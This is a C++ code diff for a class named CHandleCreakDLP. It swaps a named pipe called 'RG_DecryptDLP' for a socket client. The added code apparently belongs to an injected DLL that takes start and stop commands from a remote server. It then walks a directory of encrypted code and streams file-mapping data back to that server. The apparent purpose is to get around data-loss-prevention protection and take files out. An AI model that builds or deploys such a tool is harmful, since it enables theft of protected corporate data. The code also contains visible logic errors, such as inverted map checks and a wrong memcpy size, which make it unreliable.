@@ -9,9 +9,13 @@
 * 7、 Remark     ： 
 ****************************************************************************************************/
 #include <tchar.h>
+#include "TraceUtil.h"
 #include "comm_protocol.h"
 #include "safestl.h"
-#include "NPipe.h"
+//#include "NPipe.h"
+#include "DirectoryTraversalFile.h"
+
+#include "SocketClientHelper.h"
 
 class CHandleCreakDLP
 {
@@ -21,23 +25,24 @@ public:
 	{
 		Reset();
 		//_asm int 3;
-		m_clsNamePipe.Open(_T("RG_DecryptDLP"));
+		m_clsSocketClientHelper.Open();
 		
 	}
 
 	~CHandleCreakDLP(void)
 	{
 		Reset();
+		m_clsSocketClientHelper.Close();
 	}
 
 	bool HandleMessage()
 	{
-		//::MessageBox(NULL, "DLL已经加载", "SendFile", MB_OK);
-		//_asm int 3;
+		::MessageBox(NULL, "DLL已经加载", "SendFile", MB_OK);
+		QueueUserWorkItem((LPTHREAD_START_ROUTINE)SendMessageProc, (LPVOID)this, WT_EXECUTELONGFUNCTION);
 		m_bExitFlag = true;
 		while(m_bExitFlag)
 		{
-			Recv();
+			Recv();			
 			Sleep(1000);
 		}
 
@@ -47,45 +52,204 @@ public:
 	//一个接收服务消息
 
 private:
+	static UINT WINAPI SendMessageProc( LPVOID lpThreadParameter)
+	{
+		CHandleCreakDLP* pclsHandleCreakDLP = (CHandleCreakDLP*)lpThreadParameter;
+
+		while(pclsHandleCreakDLP->m_bExitFlag)
+		{
+			if (pclsHandleCreakDLP->m_clsSocketClientHelper.CheckConnect())
+			{
+				pclsHandleCreakDLP->SendMemSharePacket();
+			}		
+			Sleep(100);
+		}
+		return 1;
+	}
+
+	bool StartHandleCreakDLP()
+	{
+		//_asm int 3;
+		RG::TRACE(_T("*收到启动命令*\r\n"));
+		m_clsDirTraversal.Start(m_tszECodePath);
+		return true;
+	}
+
+	bool StopHandleCreakDLP()
+	{
+		RG::TRACE(_T("*收到停止命令*\r\n"));
+		//停止线程
+		m_clsDirTraversal.stop();
+		m_bExitFlag = false;
+		return true;
+	}
+
 	//接收数据
 	int Recv()
 	{
+		//_asm int 3;
 		DATAPACKET stuDataPacket;
 		stuDataPacket.Reset();
 		stuDataPacket.pstuDataHead->Reset();
 
-		int iReadLen = m_clsNamePipe.Read(stuDataPacket.pstuDataHead, sizeof(DATAHEAD));
+		int iReadLen = m_clsSocketClientHelper.Recv((PBYTE)stuDataPacket.pstuDataHead, sizeof(DATAHEAD));
 		if (!iReadLen) return iReadLen;
-		iReadLen = m_clsNamePipe.Read(stuDataPacket.szbyData+sizeof(DATAHEAD), stuDataPacket.pstuDataHead->dwPacketLen-sizeof(DATAHEAD));
+		iReadLen = m_clsSocketClientHelper.Recv(stuDataPacket.szbyData+sizeof(DATAHEAD), stuDataPacket.pstuDataHead->dwPacketLen-sizeof(DATAHEAD));
 		if (!iReadLen) return iReadLen;
-
+//_asm int 3;
+		RG::TRACE(_T("*****收到服务器消息*****\r\n"));
+		RG::TRACE(_T("包类型:0x%X;包长度:%d\r\n"), stuDataPacket.pstuDataHead->dwPacketType, stuDataPacket.dwBufLen);
 		//服务器地址下发消息
 		if (TYPE_PACKET_PATH == stuDataPacket.pstuDataHead->dwPacketType)
 		{
 			_tcscpy_s(m_tszECodePath, MAX_PATH, (TCHAR*)(stuDataPacket.szbyData+sizeof(DATAHEAD)));
-			::MessageBox(NULL, m_tszECodePath, _T("消息提示"), MB_OK);
+			RG::TRACE(_T("Path:%s\r\n"), m_tszECodePath);
 		}
 
 		//服务器命令包下发消息
 		if (TYPE_PACKET_COMMAND == stuDataPacket.pstuDataHead->dwPacketType)
 		{
-			::MessageBox(NULL, _T("收到服务器命令包下发消息"), _T("消息提示"), MB_OK);
-			m_bExitFlag = false;
+			bool bRet = true;
+			COMMAND stuCommand = {0};
+			memcpy(&stuCommand, stuDataPacket.szbyData+sizeof(DATAHEAD), sizeof(stuDataPacket.pstuDataHead->dwPacketLen-sizeof(DATAHEAD)));
+			switch(stuCommand.iCommand)
+			{
+			case COMMAND_START:
+				bRet = StartHandleCreakDLP();break;
+			case COMMAND_STOP:
+				bRet = StopHandleCreakDLP();break;
+			//以下三种暂时不处理
+			case COMMAND_PAUSE:break;
+			case COMMAND_CONTINUE:break;
+			case COMMAND_EXIT: break;
+			}
+
+			SendReplay(stuDataPacket.pstuDataHead->dwSerialNo, TYPE_OK);   //发送回复
 		}
 
 		//文件映射消息回复 
 		if (TYPE_PACKET_REPLAY_MEMSHARE == stuDataPacket.pstuDataHead->dwPacketType)
 		{
-			::MessageBox(NULL, _T("收到文件映射消息回复"), _T("消息提示"), MB_OK);
+			RG::TRACE(_T("*收到文件映射消息回复*\r\n"));
+			HandleReplay(stuDataPacket.pstuDataHead->dwSerialNo, stuDataPacket.pstuDataHead->dwReturn);
 		}
 		return iReadLen;
+	}
+
+	//回复文件映射数据包
+	DWORD SendReplay(const DWORD dwSerialNo = 0, const DWORD dwReturn = 0)
+	{
+		return SendData(TYPE_PACKET_REPLAY_COMMAND, NULL, 0, dwSerialNo, dwReturn);
+	}
+
+	//发送数据
+	DWORD SendData(const int iMessageType, const PBYTE pbyInDateBuf = NULL, const int iBufLen = 0, const DWORD dwSerialNo = 0, const DWORD dwReturn = 0)
+	{
+		DWORD dwRet = 0;
+		DATAPACKET stuPacket;
+		stuPacket.pstuDataHead->dwPacketType = iMessageType;
+		stuPacket.pstuDataHead->dwReturn = dwReturn;
+		
+		if (dwSerialNo)
+		{
+			stuPacket.pstuDataHead->dwSerialNo = dwSerialNo;			
+		}
+		else
+		{
+			stuPacket.pstuDataHead->dwSerialNo = m_dwSerialNo;			
+		}		
+
+		if (iBufLen)
+		{
+			memcpy(stuPacket.szbyData+stuPacket.dwBufLen, pbyInDateBuf, iBufLen);
+			stuPacket.dwBufLen += iBufLen;
+		}
+
+		stuPacket.pstuDataHead->dwPacketLen = stuPacket.dwBufLen;
+
+		dwRet =  m_clsSocketClientHelper.Send(stuPacket.szbyData, stuPacket.pstuDataHead->dwPacketLen);
+
+		if (dwSerialNo && dwRet)
+		{
+			SavePacket(m_dwSerialNo, stuPacket);
+			m_dwSerialNo++;
+		}
+		return dwRet;
+	}
+
+	bool SendMemSharePacket()
+	{
+		bool bRet = false;;
+		MEMSHAREINFO stuMemShareInfo;
+		stuMemShareInfo.Reset();
+		
+		if (m_clsDirTraversal.GetMemShareInfo(&stuMemShareInfo))
+		{
+			//_asm int 3;
+			bRet = SendData(TYPE_PACKET_MEMSHARE, (PBYTE)&stuMemShareInfo, sizeof(MEMSHAREINFO));
+		}	
+		return bRet;
+	}
+
+	//处理文件映射回复数据包
+	bool HandleReplay(DWORD dwSerialNo, DWORD dwReturn)
+	{
+		//
+		if (TYPE_ERROR == dwReturn)
+		{
+			RG::TRACE(_T("*收到错误数据包重发数据*\r\n"));
+			return (RepeatPacket(dwSerialNo)>0?true:false);			
+		}
+		else
+		{
+			m_mapSerialNoPacket.Lock();
+			if (0 != m_mapSerialNoPacket.count(dwSerialNo))
+			{
+				m_mapSerialNoPacket.Unlock();
+				return 0;
+			}
+
+			DATAPACKET stuPacket = m_mapSerialNoPacket[dwSerialNo];
+			m_mapSerialNoPacket.Unlock();
+
+			PMEMSHAREINFO pstuMemShareInfo = (PMEMSHAREINFO)(stuPacket.szbyData+sizeof(DATAHEAD));
+			if (pstuMemShareInfo)
+			{
+				m_clsDirTraversal.CloseMemShare(std::string(pstuMemShareInfo->stuFileInfo.tszFilePath));
+			}			
+		}
+		//如果 是正确数据包则需要解除文件映射
+	}
+
+	//重发数据
+	DWORD RepeatPacket(DWORD dwSerialNo)
+	{
+		m_mapSerialNoPacket.Lock();
+		if (0 != m_mapSerialNoPacket.count(dwSerialNo))
+		{
+			m_mapSerialNoPacket.Unlock();
+			return 0;
+		}
+
+		DATAPACKET stuPacket = m_mapSerialNoPacket[dwSerialNo];
+		m_mapSerialNoPacket.Unlock();
+		return  m_clsSocketClientHelper.Send(stuPacket.szbyData, stuPacket.pstuDataHead->dwPacketLen);
+	}
+
+	void SavePacket(DWORD dwSerialNo, DATAPACKET& stuPacket)
+	{
+		m_mapSerialNoPacket.Lock();
+		if (0 == m_mapSerialNoPacket.count(dwSerialNo))
+		{
+			m_mapSerialNoPacket[dwSerialNo] = stuPacket;
+		}
+		m_mapSerialNoPacket.Unlock();
 	}
 
 	void Reset()
 	{
 		m_dwSerialNo = 0;
-		m_bExitFlag = false;
-		m_clsNamePipe.Close();
+		m_bExitFlag = false;		
 		memset(m_tszECodePath, 0, MAX_PATH*sizeof(TCHAR));
 		m_mapSerialNoPacket.Lock();
 		m_mapSerialNoPacket.clear();
@@ -93,7 +257,8 @@ private:
 	}
 
 private:
-	RG::CNamedPipe                          m_clsNamePipe;
+	CDirTraversal                           m_clsDirTraversal;             //遍历目录
+	CSocketClientHelper                     m_clsSocketClientHelper;
 	bool                                    m_bExitFlag;                   //线程退出标志
 	DWORD                                   m_dwSerialNo;                  //流水号
 	TCHAR                                   m_tszECodePath[MAX_PATH];      //加密代码路径
